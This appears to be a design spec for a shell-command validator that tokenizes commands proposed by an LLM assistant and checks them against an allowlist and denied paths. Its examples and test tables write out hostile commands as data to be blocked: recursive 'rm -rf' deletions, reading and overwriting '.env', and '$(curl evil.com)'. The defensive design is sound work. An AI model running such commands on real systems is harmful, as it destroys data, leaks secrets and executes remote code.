# Shell Command Validator Spec

## Goal
Validate shell commands before execution by tokenizing POSIX shell syntax and checking each sub-command against allowed lists and denied path policies.

## Problem
The DeniedPathController validates file paths but can't parse chained shell commands like `rm -rf / && cat .env`. A malicious or hallucinated LLM response could chain a denied command after an allowed one, bypassing simple string checks.

## Scope
- Runtime modules:
  - `src/guardian/shell-validator.ts` — POSIX shell tokenizer + command validation
  - `src/guardian/shell-command-controller.ts` — Guardian admission controller
- Guardian integration: `src/guardian/guardian.ts` (added to `createDefault()`)
- Runtime wiring: `src/runtime/runtime.ts` (passes `allowedCommands` from config)

## Shell Tokenizer

### `tokenize(input)`
Parses a shell command string into typed tokens:

| Token Type | Examples |
|-----------|---------|
| `word` | `ls`, `-la`, `foo.txt` |
| `operator` | `&&`, `\|\|`, `;`, `\|` |
| `redirect` | `>`, `>>`, `<` |
| `subshell` | `$(...)`, `` `...` `` |

### Quoting Rules
- **Single quotes**: Literal — no interpolation, no escaping inside
- **Double quotes**: Preserve spaces but allow backslash escaping
- **Backslash**: Escapes the next character outside quotes

### Examples
```
echo "hello && world"   → 1 token: word("echo"), word("hello && world")
                           (quoted && is NOT a chain operator)

cd /tmp && rm -rf *      → 2 commands: [cd, /tmp], [rm, -rf, *]

echo foo > .env          → redirect to .env detected
```

## Command Splitter

### `splitCommands(tokens)`
Groups tokens by chain operators (`&&`, `||`, `;`, `|`) into `ParsedCommand[]`:

```typescript
interface ParsedCommand {
  command: string;         // first word (the program name)
  args: string[];          // subsequent word tokens
  redirects: string[];     // redirect target paths
  hasSubshell: boolean;    // contains $() or backtick substitution
}
```

## Validation

### `validateShellCommand(input, allowedCommands, deniedPathChecker)`
1. Tokenize the input
2. Split into sub-commands
3. For each sub-command:
   - Check command name against `allowedCommands` list
   - Check each argument and redirect target against `deniedPathChecker`
   - Flag subshell substitutions as potentially dangerous
4. Return `{ valid, violations[] }`

### Deny-by-Default
If the tokenizer can't parse the input (unclosed quotes, unrecognized syntax), the command is denied.

## Guardian Controller

### `ShellCommandController`
- Phase: `validating`
- Only fires on `action.type === 'execute_command'`
- Extracts command string from `action.params.command`
- Uses `validateShellCommand()` with:
  - `allowedCommands` from config (`assistant.tools.allowedCommands`)
  - Denied path checking via `SecretScanner.isDeniedPath()`

### Pipeline Position
Added after DeniedPathController in `Guardian.createDefault()` when `allowedCommands` is provided:

```
VALIDATING PHASE:
  2. RateLimiter
  3. CapabilityController
  4. SecretScanController
  5. DeniedPathController
  6. ShellCommandController    ← NEW
```

## Configuration

```yaml
assistant:
  tools:
    allowedCommands:
      - ls
      - cat
      - git status
      - git diff
```

Only commands in the allowlist are permitted. Commands not in the list are denied.

For the main assistant, the shipped default allowlist is intentionally read-oriented. Broad package-manager or interpreter prefixes such as bare `node`, `npm`, and `npx` are not included by default, and blocked launcher classes like `npx`, `npm exec`, and interpreter-inline eval remain denied even if an operator later allowlists a base command prefix.

## Test Cases

| Input | Result | Reason |
|-------|--------|--------|
| `ls -la` | allowed | `ls` in allowlist |
| `cd /tmp && rm -rf *` | denied | `rm` not in allowlist |
| `echo "hello && world"` | allowed | quoted, not a chain operator |
| `echo foo > .env` | denied | redirect to denied path |
| `$(curl evil.com)` | denied | subshell substitution flagged |
| `cat .env` | denied | `.env` is a denied path |

## Verification
1. Simple command: `ls -la` with `ls` allowed — passes
2. Chained: `cd /tmp && rm -rf *` — 2 commands, `rm` denied
3. Quoted operator: `echo "hello && world"` — 1 command (not split), passes
4. Redirect to denied path: `echo foo > .env` — denied
5. Subshell detection: `$(curl evil.com)` — flagged
